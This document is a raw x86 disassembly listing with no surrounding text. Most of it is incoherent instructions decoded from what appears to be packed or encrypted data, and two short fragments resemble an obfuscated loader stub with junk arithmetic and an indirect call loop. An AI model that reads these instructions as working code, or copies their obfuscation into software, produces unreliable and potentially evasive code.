  40991f:	mov    esi,0xd6a6f20f
  409924:	in     eax,dx
  409925:	(bad)  [ebp+0x35]
  409928:	pop    edx
  409929:	jne    0x4098f4
  40992b:	or     ch,BYTE PTR [esi]
  40992d:	ins    DWORD PTR es:[edi],dx
  40992e:	cmp    dl,BYTE PTR [eax+0x6453459e]
  409934:	leave  
  409935:	outs   dx,DWORD PTR ds:[esi]
  409936:	ficomp WORD PTR [edx]
  409938:	call   0xca6b:0x29b437a4
  40993f:	cli    
  409940:	pop    ecx
  409941:	icebp  
  409942:	adc    ch,bl
  409944:	ja     0x40992c
  409946:	or     BYTE PTR [edi+0x4e],bh
  409949:	rcl    DWORD PTR [ecx+0x7f],1
  40994c:	aaa    
  40994d:	gs push ebx
  40994f:	jne    0x4099a1
  409951:	aam    0xc8
  409953:	popa   
  409954:	push   ds
  409955:	jmp    0x4098f0
  409957:	ja     0x40992b
  409959:	imul   edx,DWORD PTR [esi+0x10],0xffffffde
  40995d:	mov    esp,0x5076a9f0
  409962:	sbb    bl,BYTE PTR [edx+0x368a0a5]
  409968:	cmp    BYTE PTR [eax-0x52],dl
  40996b:	int3   
  40996c:	inc    ebp
  40996d:	mov    bl,0xf4
  40996f:	and    cl,BYTE PTR [ebp+0x6b360907]
  409975:	or     BYTE PTR [ecx+0x18ca87cd],ah
  40997b:	and    BYTE PTR [edx+0x5cba6d71],al
  409981:	xchg   esp,eax
  409982:	add    cl,cl
  409984:	pop    edx
  409985:	xchg   ecx,eax
  409986:	mov    ds:0x935a9050,al
  40998b:	xchg   BYTE PTR [ebp-0x63f48430],dl
  409991:	into   
  409992:	hlt    
  409993:	xchg   esp,eax
  409994:	adc    dh,ch
  409996:	cmp    eax,0x102ba86f
  40999b:	sti    
  40999c:	jg     0x40999e
  40999e:	imul   BYTE PTR [edi-0x1cb80291]
  4099a4:	adc    eax,0xf34fd3d8
  4099a9:	fstp   DWORD PTR [ebp-0x79fab1ce]
  4099af:	out    0x78,eax
  4099b1:	xor    esp,DWORD PTR [esi+0x17]
  4099b4:	adc    BYTE PTR [esp+edi*8-0x88e53c4],al
  4099bb:	mov    ?,esp
  4099bd:	mov    esi,0x4e554cff
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e19c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e317
  4099eb:	mov    edi,DWORD PTR ds:0x42e327
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e81c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e1a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fd79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e19c
  409a3d:	sbb    DWORD PTR ds:0x42e76b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	imul   edi
  409a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5b:	mov    dh,ah
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a0a
  409a66:	iret   
  409a67:	cld    
  409a68:	lock out dx,eax
  409a6a:	jge    0x409a83
  409a6c:	jle    0x409a87
  409a6e:	sbb    dh,ah
  409a70:	div    DWORD PTR [edx-0x724d3ccd]
  409a76:	pop    eax
  409a77:	repz mov dh,0xf4
  409a7a:	call   0xa3cc:0x37cde863
  409a81:	xor    DWORD PTR [edx+0x2f],ebp
  409a84:	cmp    eax,0x9c4e2bcc
  409a89:	test   eax,0x833b7748
  409a8e:	jno    0x409b0d
  409a90:	sbb    cl,ah
  409a92:	test   BYTE PTR ds:0x990f9887,dl
  409a98:	ffree  st(0)
  409a9a:	push   ecx
  409a9b:	or     al,0x63
  409a9d:	and    BYTE PTR [esi+0x7c],cl
  409aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa1:	mov    ?,edi
  409aa3:	les    ebp,FWORD PTR [ebx+0x1e]
  409aa6:	stos   DWORD PTR es:[edi],eax
  409aa7:	fsub   DWORD PTR [ecx-0x10]
  409aaa:	loop   0x409b01
  409aac:	ja     0x409a45
  409aae:	mov    al,0xfa
  409ab0:	mov    esp,0x6baa3bb2
  409ab5:	stos   DWORD PTR es:[edi],eax
  409ab6:	mov    dh,0xe1
  409ab8:	sub    BYTE PTR [edx-0x19d92f86],ah
  409abe:	adc    al,0x5b
  409ac0:	(bad)  
  409ac1:	pusha  
  409ac2:	stos   DWORD PTR es:[edi],eax
  409ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ac4:	repnz pusha 
  409ac6:	mov    ah,0x6c
  409ac8:	xchg   esi,eax
  409ac9:	pop    esp
  409aca:	mov    bh,0xc1
  409acc:	pop    ecx
  409acd:	arpl   WORD PTR [ecx],cx
  409acf:	(bad)  
  409ad0:	mov    esi,0x80365805
  409ad5:	xchg   edx,edi
  409ad7:	rcl    BYTE PTR [edx],cl
  409ad9:	imul   ecx,DWORD PTR [ebx-0x180b1547],0x2
  409ae0:	mov    dl,0x29
  409ae2:	hlt    
  409ae3:	cmp    ch,BYTE PTR [edx+edx*8-0x18ce1013]
  409aea:	add    al,BYTE PTR [edi+ecx*1]
  409aed:	push   edx
  409aee:	sbb    ebx,ecx
  409af0:	aaa    
  409af1:	pusha  
  409af2:	repz jle 0x409b2c
  409af5:	dec    ebx
  409af6:	jno    0x409ae9
  409af8:	mov    cs,edx
  409afa:	push   edi
  409afb:	push   ecx
  409afc:	pop    edx
  409afd:	mov    ebp,0xfc75a79f
  409b02:	dec    esi
  409b03:	xor    DWORD PTR [esi+0x4bbf6f76],edx
  409b09:	(bad)  
  409b0a:	cmp    DWORD PTR [edx+0x2da9aa22],edx
  409b10:	test   BYTE PTR [ebp+0x355fa22],cl
  409b16:	in     eax,dx
  409b17:	xor    eax,0xc0a67e36
  409b1c:	pop    esp
  409b1d:	jge    0x409af3
  409b1f:	xor    esp,ecx
  409b21:	(bad)  
  409b24:	dec    ebx
  409b25:	jl     0x409aff
  409b27:	dec    eax
  409b28:	and    BYTE PTR [edi+0x12b7e4ed],bl
  409b2e:	outs   dx,BYTE PTR ds:[esi]
  409b2f:	imul   ebx,edi,0xffffffca
  409b32:	ss jns 0x409b7d
  409b35:	ja     0x409b1d
  409b37:	xor    al,0x7
  409b39:	mov    ah,0x0
  409b3b:	jge    0x409ae4
  409b3d:	out    0xc6,eax
  409b3f:	or     eax,DWORD PTR [eax-0x73]
  409b42:	add    al,0xdf
  409b44:	pushf  
  409b45:	push   esp
  409b46:	fwait
  409b47:	or     al,0x42
  409b49:	pusha  
  409b4a:	or     eax,0x6220b5c5
  409b4f:	out    0x4b,al
  409b51:	rcl    DWORD PTR [edi-0x107b4838],1
  409b57:	dec    edx
  409b58:	or     ebx,DWORD PTR [eax-0x7fe505d4]
  409b5e:	and    al,0xa4
  409b60:	sub    eax,0x7b821c88
  409b65:	cmp    DWORD PTR [ecx+0x612f1c45],eax
  409b6b:	mov    DWORD PTR [ecx+0x51],ecx
  409b6e:	cmp    eax,eax
  409b70:	pop    ebp
  409b71:	xor    ebx,DWORD PTR [edi+esi*2+0xbb1f01b]
  409b78:	outs   dx,BYTE PTR ds:[esi]
  409b79:	adc    dl,bh
  409b7b:	mov    esi,0x83e5c665
  409b80:	cmp    al,bl
  409b82:	(bad)  
  409b83:	sub    BYTE PTR [edx],ah
  409b85:	push   ss
  409b86:	lds    esp,FWORD PTR [esp+edi*8]
  409b89:	je     0x409b40
  409b8b:	push   ecx
  409b8c:	xchg   ebx,eax
  409b8d:	inc    esi
  409b8e:	add    DWORD PTR [edx],ebx
  409b90:	dec    edi
  409b91:	pop    esp
  409b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b93:	inc    esp
  409b94:	icebp  
  409b95:	(bad)  [ebp+0x27]
  409b98:	cdq    
  409b99:	scas   al,BYTE PTR es:[edi]
  409b9a:	bound  ebx,QWORD PTR fs:[ebx-0x2c4dc2df]
  409ba1:	jl     0x409b6e
  409ba3:	daa    
  409ba4:	nop
  409ba5:	out    0xf3,eax
  409ba7:	lea    ebx,[edi+0x6b]
  409baa:	ins    DWORD PTR es:[edi],dx
  409bab:	stc    
  409bac:	leave  
  409bad:	fs inc ecx
  409baf:	sub    dl,BYTE PTR [ecx+0x42]
  409bb2:	jo     0x409c26
  409bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb5:	into   
  409bb6:	div    cl
  409bb8:	stos   BYTE PTR es:[edi],al
  409bb9:	jp     0x409be8
  409bbb:	adc    ebx,DWORD PTR [ebp-0x38372895]
  409bc1:	fst    DWORD PTR [edx-0x316dbc41]
  409bc7:	xchg   ebx,eax
  409bc8:	data16 sahf 
  409bca:	adc    esi,esi
  409bcc:	sti    
  409bcd:	jb     0x409c41
  409bcf:	xchg   esi,eax
  409bd0:	ja     0x409c42
  409bd2:	mov    al,0x94
  409bd5:	mov    ah,0x52
  409bd7:	aad    0x25
  409bd9:	mov    eax,ds:0x2a95debd
  409bde:	out    0x7b,al
  409be0:	push   ss
  409be1:	add    al,0x24
  409be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be4:	sub    bl,BYTE PTR [esi]
  409be6:	mov    ?,WORD PTR [ebx+0x35f3de35]
  409bec:	fwait
  409bed:	adc    DWORD PTR ds:[ecx+0x5c9ae2bc],edi
  409bf4:	xchg   esi,eax
  409bf5:	adc    edi,edx
  409bf7:	or     al,0x33
  409bf9:	lahf   
  409bfa:	push   DWORD PTR [ecx]
  409bfc:	jbe    0x409c71
  409bfe:	mov    dh,0x88
  409c00:	add    esi,DWORD PTR [ebx-0x6e]
  409c03:	neg    DWORD PTR ds:0x52ff597f
  409c09:	(bad)  
  409c0a:	mov    esi,0x7a46999e
  409c0f:	xchg   DWORD PTR ss:[ebx],eax
  409c12:	xchg   ebp,eax
  409c13:	repnz mov cl,0x98
  409c16:	cs stos DWORD PTR es:[edi],eax
  409c18:	jmp    0x409c86
  409c1a:	pop    eax
  409c1b:	and    eax,0xd1c647d9
  409c20:	sub    ebp,esp
  409c22:	mov    ds:0xa5a971d5,al
  409c27:	pop    ecx
  409c28:	push   ds
  409c29:	fnsave ds:0xd8c71836
  409c2f:	mov    bl,0xb6
  409c31:	inc    esp
  409c32:	into   
  409c33:	xor    BYTE PTR [ebp+eiz*1+0x648632d8],dl
  409c3a:	mov    eax,0x71073050
  409c3f:	adc    al,0x54
  409c41:	dec    ebx
  409c42:	xchg   ebp,eax
  409c43:	xor    DWORD PTR [eax],ebx
  409c45:	clc    
  409c46:	shl    edx,cl
  409c48:	mov    DWORD PTR [ecx+0x70130ca4],ebp
  409c4e:	mov    ds:0x2ea7e334,al
  409c53:	sub    ah,BYTE PTR [edx-0x1b]
  409c56:	mul    BYTE PTR [esi+0x27078e02]
  409c5c:	stc    
  409c5d:	dec    esp
  409c5e:	adc    dh,dl
  409c60:	jp     0x409cc3
  409c62:	stos   BYTE PTR es:[edi],al
  409c63:	push   0x60e5fff5
  409c68:	xchg   ebp,eax
  409c69:	xchg   edx,eax
  409c6a:	push   0xbbfd7550
  409c6f:	dec    edi
  409c70:	or     al,0xbf
  409c72:	pop    esp
  409c73:	cmc    
  409c74:	test   DWORD PTR [esi+eiz*1],eax
  409c77:	mov    dl,0xcb
  409c79:	mov    es,WORD PTR [ebp-0x6e0292a1]
  409c7f:	jg     0x409c9e
  409c81:	aam    0xc1
  409c83:	pop    es
  409c84:	adc    cl,BYTE PTR [edx]
  409c86:	repz pop edx
  409c88:	cmp    ah,BYTE PTR [ebp+0x5a]
  409c8b:	pop    edx
  409c8c:	popf   
  409c8d:	pop    esp
  409c8e:	dec    ebx
  409c8f:	mov    al,0xc7
  409c91:	cwde   
  409c92:	(bad)  
  409c93:	adc    edi,esp
  409c95:	out    0xd0,eax
  409c97:	shr    DWORD PTR [ebx],0x14
  409c9a:	push   edi
  409c9b:	adc    BYTE PTR [ecx+0x5d303fe9],ah
  409ca1:	and    BYTE PTR [edx-0x37],al
  409ca4:	je     0x409c3b
  409ca6:	pop    esi
  409ca7:	pop    ds
  409ca8:	xchg   ecx,eax
  409ca9:	int3   
  409caa:	adc    DWORD PTR ds:0x8f064e0d,ebp
  409cb0:	sub    DWORD PTR ss:[ebx+0x48],esp
  409cb4:	in     al,dx
  409cb5:	pushf  
  409cb6:	call   0x4a634c42
  409cbb:	add    BYTE PTR [edx+0x4c],al
  409cbe:	jmp    0x409ca0
  409cc0:	test   al,0xde
  409cc2:	mov    dh,0x64
  409cc4:	jl     0x409d02
  409cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc7:	xchg   BYTE PTR ds:0xc38ba2ba,dh
  409ccd:	pop    edi
  409cce:	fbld   TBYTE PTR [esi+0x1449505d]
  409cd4:	lock scas al,BYTE PTR es:[edi]
  409cd6:	mov    esp,0x89bc6362
  409cdb:	lock xchg ebx,eax
  409cdd:	xchg   esp,eax
  409cde:	les    edi,FWORD PTR [esi+0x4a]
  409ce1:	or     dh,BYTE PTR [ebx+edi*1-0x33]
  409ce5:	mov    dl,0x80
  409ce7:	xor    eax,0x39752d48
  409cec:	dec    edi
  409ced:	pop    edi
  409cee:	ret    0x5f22
  409cf1:	sbb    ebp,DWORD PTR [eax-0x7]
  409cf4:	or     al,BYTE PTR [edx+ecx*8+0x52]
  409cf8:	cld    
  409cf9:	std    
  409cfa:	(bad)  
  409cfb:	(bad)  
  409cfc:	call   0x84df:0x903dbc0b
  409d03:	mov    eax,0x16647df2
  409d08:	ins    DWORD PTR es:[edi],dx
  409d09:	fadd   DWORD PTR ds:0x733c038f
  409d0f:	test   eax,0x8c4f8e67
  409d14:	imul   edi,DWORD PTR [esi-0x29],0xffffffb5
  409d18:	and    DWORD PTR [eax+0x27c77ffd],ecx
  409d1e:	stos   BYTE PTR es:[edi],al
  409d1f:	sub    al,BYTE PTR [edx-0x27]
  409d22:	jmp    0x632:0x84904802
  409d29:	test   BYTE PTR [ebp+0x363abbd7],dh
  409d2f:	mov    dl,0xd3
  409d31:	sbb    eax,0xb908fb7e
  409d36:	adc    bh,bl
  409d38:	gs ja  0x409ce2
  409d3b:	jl     0x409d49
  409d3d:	aas    
  409d3e:	loope  0x409d4c
  409d40:	mov    eax,0xd3ddd7a3
  409d45:	cdq    
  409d46:	jae    0x409d2b
  409d48:	fidivr DWORD PTR [ebx+0x2dac968c]
  409d4e:	mov    eax,DWORD PTR [ebp-0x16]
  409d51:	je     0x409ce5
  409d53:	scas   eax,DWORD PTR es:[edi]
  409d54:	js     0x409dc3
  409d56:	mov    eax,0x29bc8bf1
  409d5b:	sbb    dl,cl
  409d5d:	jbe    0x409d9d
  409d5f:	imul   ebp,DWORD PTR [edi-0x46],0x4b
  409d63:	inc    ebp
  409d64:	fldenv [ebx-0x3292d800]
  409d6a:	ffree  st(7)
  409d6c:	inc    esi
  409d6d:	pop    ecx
  409d6e:	push   es
  409d6f:	mov    esp,0x615bb5b6
  409d74:	ret    0x1db4
  409d77:	xor    BYTE PTR es:[edx+ecx*8],ch
  409d7b:	inc    DWORD PTR [edi+0x5]
  409d7e:	xchg   BYTE PTR [ebx],ch
  409d80:	pushf  
  409d81:	xor    BYTE PTR [ebx-0x64],ah
  409d84:	cs aam 0x89
  409d87:	sub    BYTE PTR [edi+0x79],ah
  409d8a:	cmp    DWORD PTR [eax],esp
  409d8c:	mov    cl,0x0
  409d8e:	sub    ch,bh
  409d90:	and    al,0x4d
  409d92:	dec    ecx
  409d93:	jnp    0x409d44
  409d95:	pop    esp
  409d96:	inc    esp
  409d97:	cmp    al,0xe0
  409d99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d9a:	scas   al,BYTE PTR es:[edi]
  409d9b:	loope  0x409dd0
  409d9d:	inc    esi
  409d9e:	dec    edx
  409d9f:	xor    BYTE PTR [eax],ah
  409da1:	ror    DWORD PTR [edi+0x284e2753],0xc
  409da8:	push   eax
  409da9:	mov    ss,WORD PTR [edi-0x2a]
  409dac:	push   esi
  409dad:	icebp  
  409dae:	test   al,0xa1
  409db0:	xchg   BYTE PTR [esi-0x28],ch
  409db3:	sahf   
  409db4:	clc    
  409db5:	jne    0x409dfc
  409db7:	cmp    al,0xa9
  409db9:	or     ah,BYTE PTR [edx]
  409dbb:	sub    eax,DWORD PTR [ecx]
  409dbd:	adc    al,0xbb
  409dbf:	ss pop esi
  409dc1:	pop    es
  409dc2:	call   0x10b8:0xe7f3b2c6
  409dc9:	inc    ebp
  409dca:	xchg   ebx,eax
  409dcb:	mov    edi,0xeefe51df
  409dd0:	mov    ebx,0xfa5e01e4
  409dd5:	xor    eax,0x270d0d1c
  409dda:	xchg   edi,eax
  409ddb:	xchg   ebx,eax
  409ddc:	dec    edi
  409ddd:	cmp    ecx,eax
  409ddf:	push   ecx
  409de0:	push   eax
  409de1:	aam    0x6a
  409de3:	xchg   ebp,eax
  409de4:	xchg   esp,eax
  409de5:	mov    esi,0xa9ec318c
  409dea:	sbb    DWORD PTR [ebp+0x6f8a413e],esi
  409df0:	or     al,0x21
  409df2:	stos   BYTE PTR es:[edi],al
  409df3:	fwait
  409df4:	adc    dl,BYTE PTR [ecx-0x2fb998e5]
  409dfa:	or     al,0x5f
  409dfc:	call   0xdbcc:0xe3171469
  409e03:	dec    edx
  409e04:	rol    dh,0x3
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fe0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fd79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e1a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e363
  409e51:	mov    edi,DWORD PTR ds:0x42fe02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e783,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	in     eax,0xad
  409e83:	xchg   ebx,eax
  409e84:	mov    eax,0x7070e826
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ec5
  409e8e:	fwait
  409e8f:	in     al,0xe0
  409e91:	mov    ebx,0x3d790785
  409e96:	jmp    0x3e45fcc0
  409e9b:	imul   ebp,DWORD PTR [eax+edi*1-0x43],0xffffff92
  409ea0:	js     0x409e6d
  409ea2:	sbb    al,0x92
  409ea4:	stc    
  409ea5:	lods   eax,DWORD PTR ds:[esi]
  409ea6:	push   ebx
  409ea7:	in     al,0x5e
  409ea9:	lahf   
  409eaa:	icebp  
  409eab:	sub    DWORD PTR [ecx+eax*4-0x75],0xffffffe5
  409eb0:	cmp    eax,0xf935474f
  409eb5:	loopne 0x409e55
  409eb7:	mov    bh,0xc9
  409eb9:	ja     0x409ef8
  409ebb:	push   cs
  409ebc:	mov    al,ds:0x87f10475
  409ec1:	pop    ds
  409ec2:	adc    eax,0xbeade845
  409ec7:	(bad)  
  409ec8:	push   esi
  409ec9:	icebp  
  409eca:	imul   ebx,DWORD PTR [esi+0x481b0c32],0xe9efd6b9
  409ed4:	loopne 0x409efe
  409ed6:	and    DWORD PTR [edi+ebx*8-0x42],ecx
  409eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409edb:	lock mov bl,0xea
  409ede:	(bad)  
  409edf:	popf   
  409ee0:	push   cs
  409ee1:	or     BYTE PTR [edx-0x738e0026],dl
  409ee7:	gs jne 0x409eee
  409eea:	and    BYTE PTR [ebp-0x34],ch
  409eed:	mov    cl,0xb1
  409eef:	out    0x74,al
  409ef1:	ds sahf 
  409ef3:	inc    edi
  409ef4:	stos   BYTE PTR es:[edi],al
  409ef5:	sar    BYTE PTR [ebx],1
  409ef7:	out    0x3f,eax
  409ef9:	add    eax,0xb9f21913
  409efe:	xchg   DWORD PTR [ecx+0x4c],ecx
  409f01:	jmp    0x409f7e
  409f03:	out    0x7b,eax
  409f05:	adc    edi,DWORD PTR [edx]
  409f07:	jb     0x409ed9
  409f09:	jg     0x409ed5
  409f0b:	jmp    0x409eb6
  409f0d:	ror    DWORD PTR [ebx-0x44d0e47d],cl
  409f13:	(bad)  
  409f15:	ins    BYTE PTR es:[edi],dx
  409f16:	dec    edx
  409f17:	cmp    eax,0x5c4ea5df
  409f1c:	call   0x46d9546a
  409f21:	repz cmp al,0x15
  409f24:	mov    esp,0x65d4c78
  409f29:	out    dx,eax
  409f2a:	cmp    edx,DWORD PTR [edi-0x3526ba67]
  409f30:	push   cs
  409f31:	and    BYTE PTR [edx+0x6741c613],dl
  409f37:	cmp    al,0x28
  409f39:	push   esi
  409f3a:	add    eax,0xb3429f7f
  409f3f:	lsl    esp,WORD PTR [eax+0x38]
  409f43:	cmp    ecx,DWORD PTR [edx+0x74371e7e]
  409f49:	btc    DWORD PTR [esi-0x41],0xe0
  409f4e:	retf   
  409f4f:	in     eax,dx
  409f50:	cmp    BYTE PTR [eax],0xb2
  409f53:	cmp    ah,BYTE PTR [ecx-0x5260205e]
  409f59:	in     eax,dx
  409f5a:	mov    ebx,0x960eca05
  409f5f:	push   0xf3748166
  409f64:	mov    ss,esi
  409f66:	outs   dx,BYTE PTR ds:[esi]
  409f67:	sub    DWORD PTR [edx+eiz*4+0x7],eax
  409f6b:	enter  0x6c3b,0x50
  409f6f:	fisub  WORD PTR [ecx+ebp*4]
  409f72:	cmp    eax,0xb73d41f7
  409f77:	std    
  409f78:	inc    edi
  409f79:	jl     0x409f73
  409f7b:	test   eax,0x73cbd557
  409f80:	cmp    ah,BYTE PTR [ebx+0x37]
  409f83:	outs   dx,BYTE PTR ds:[esi]
  409f84:	call   0x8c797c8e
  409f89:	adc    BYTE PTR [eax-0xb55e861],ch
  409f8f:	fimul  WORD PTR [edx]
  409f91:	(bad)  
  409f93:	sub    ecx,DWORD PTR [eax+edi*1]
  409f96:	call   0x3b6f:0x13f07076
  409f9d:	data16 aad 0xfb
  409fa0:	(bad)  [edx]
  409fa2:	push   edx
  409fa3:	stc    
  409fa4:	shr    DWORD PTR [eax-0x7b534488],cl
  409faa:	test   DWORD PTR [ebx+0x739d4a10],0xbd0cfb26
  409fb4:	cmp    eax,ebx
  409fb6:	sub    BYTE PTR [ecx],ah
  409fb8:	cwde   
  409fb9:	pop    es
  409fba:	cli    
  409fbb:	adc    al,0xfb
  409fbd:	mov    esp,0xb5fb6e89
  409fc2:	xchg   edi,eax
  409fc3:	nop
  409fc4:	sub    edx,ecx
  409fc6:	sbb    al,0xd3
  409fc8:	hlt    
  409fc9:	dec    ecx
  409fca:	inc    edi
  409fcb:	rcr    BYTE PTR [ecx],1
  409fcd:	mov    bh,bh
  409fcf:	and    edx,DWORD PTR [esi+ebp*1-0x10]
  409fd3:	cmp    edx,DWORD PTR [edx+0x6aad0da1]
  409fd9:	mov    al,ds:0x20c3600c
  409fde:	push   esi
  409fdf:	ret    
  409fe0:	lahf   
  409fe1:	jl     0x409f9c
  409fe3:	leave  
  409fe4:	cmp    al,0x4d
  409fe6:	daa    
  409fe7:	pop    eax
  409fe8:	mov    bh,0x95
  409fea:	mov    ds:0x475dc8dd,al
  409fef:	sub    eax,0xaeb10409
  409ff4:	test   DWORD PTR [edx-0x4c],ebp
  409ff7:	pop    ss
  409ff8:	push   eax
  409ff9:	add    DWORD PTR [edi+0x2a],ecx
  409ffc:	sbb    eax,0x553a7505
  40a001:	fadd   DWORD PTR [esi]
  40a003:	in     eax,dx
  40a004:	jae    0x40a061
  40a006:	cmp    BYTE PTR [esi+0x2a290a28],al
  40a00c:	pop    ds
  40a00d:	cmp    al,0xfd
  40a00f:	xor    DWORD PTR [edx+ebx*1],ebp
  40a012:	add    DWORD PTR [ecx],esp
  40a014:	addr16 mov ebx,es
  40a017:	push   0x95987096
  40a01c:	ret    0xb3f8
  40a01f:	daa    
  40a020:	aas    
  40a021:	mov    cl,0xdc
  40a023:	push   edi
  40a024:	cmp    BYTE PTR [ecx+0x7e890c12],ch
  40a02a:	sbb    esi,edx
  40a02c:	ja     0x40a08b
  40a02e:	std    
  40a02f:	hlt    
  40a030:	add    bh,BYTE PTR [edx+esi*2+0x41]
  40a034:	xor    eax,0xa16a4545
  40a039:	iret   
  40a03a:	ss cmc 
  40a03c:	sbb    BYTE PTR [ecx-0x3b2a1419],bh
  40a042:	dec    edx
  40a043:	or     edx,DWORD PTR [ebx]
  40a045:	and    dl,BYTE PTR [ebp-0x7d6005d6]
  40a04b:	sub    ecx,edx
  40a04d:	cmp    eax,0x61ab302
  40a052:	mov    ecx,0x82b40d51
  40a057:	pushf  
  40a058:	mov    BYTE PTR [ecx+0x1e],al
  40a05b:	arpl   WORD PTR [edi],sp
  40a05d:	sti    
  40a05e:	xor    al,0x44
  40a060:	ret    
  40a061:	dec    esp
  40a062:	or     ebp,DWORD PTR [ebp+0x61]
  40a065:	je     0x40a0be
  40a067:	add    ah,al
  40a069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a06a:	cmp    bh,BYTE PTR [ebx+0x21287dba]
  40a070:	fsub   QWORD PTR [edx+0x3a]
  40a073:	inc    edi
  40a074:	xchg   esp,eax
  40a075:	cmc    
  40a076:	jle    0x40a0b7
  40a078:	push   0x59867014
  40a07d:	sbb    al,0xcd
  40a080:	repnz bound ecx,QWORD PTR [edx+0x5cb617b3]
  40a087:	ror    BYTE PTR [edx+0xb],cl
  40a08a:	sub    DWORD PTR [esi-0x57],ebx
  40a08d:	and    ah,BYTE PTR [ecx]
  40a08f:	push   es
  40a090:	jnp    0x40a032
  40a092:	repnz (bad) 
  40a094:	cmp    dl,BYTE PTR [ebp+esi*1-0x2f]
  40a098:	(bad)  
  40a099:	loope  0x40a0db
  40a09b:	sub    esp,eax
  40a09d:	stc    
  40a09e:	push   0xffffffbc
  40a0a0:	loopne 0x40a08b
  40a0a2:	dec    esi
  40a0a3:	sub    cl,BYTE PTR [eax-0x79]
  40a0a6:	xlat   BYTE PTR ds:[ebx]
  40a0a7:	push   ebx
  40a0a8:	and    ebp,DWORD PTR [ecx+0x3e3dee4a]
  40a0ae:	or     eax,0x4cc2c7be
  40a0b3:	mov    esp,0xf3f88a9b
  40a0b8:	adc    DWORD PTR [edx-0x4e],0x69de79e4
  40a0bf:	fucom  st(7)
  40a0c1:	xor    eax,0xce123286
  40a0c6:	sub    BYTE PTR [ebp-0x78],0x62
  40a0ca:	aad    0x86
  40a0cc:	jbe    0x40a0cd
  40a0ce:	das    
  40a0cf:	das    
  40a0d0:	aas    
  40a0d1:	outs   dx,DWORD PTR ds:[esi]
  40a0d2:	scas   eax,DWORD PTR es:[edi]
  40a0d3:	cmp    BYTE PTR [ebx-0x3d],bh
  40a0d6:	shr    BYTE PTR [edx-0x10],cl
  40a0d9:	ret    0x12a3
  40a0dc:	test   edx,esp
  40a0de:	adc    BYTE PTR [ecx],0x61
  40a0e1:	enter  0x894f,0x41
  40a0e5:	sti    
  40a0e6:	dec    ecx
  40a0e7:	pop    edx
  40a0e8:	or     dl,cl
  40a0ea:	shl    ah,0x71
  40a0ed:	sub    al,0x58
  40a0ef:	je     0x40a15c
  40a0f1:	dec    ebx
  40a0f2:	add    ecx,DWORD PTR [edi]
  40a0f4:	icebp  
  40a0f5:	xlat   BYTE PTR ds:[ebx]
  40a0f6:	ror    DWORD PTR [ecx-0x44],0xdb
  40a0fa:	pop    eax
  40a0fb:	add    ecx,DWORD PTR [eax-0x59]
  40a0fe:	push   esi
  40a0ff:	jae    0x40a141
  40a101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a102:	loopne 0x40a0d6
  40a104:	es stos DWORD PTR es:[edi],eax
  40a106:	lea    ecx,[edi]
  40a108:	fsubr  st,st(6)
  40a10a:	or     BYTE PTR ds:0x53fe8811,0x89
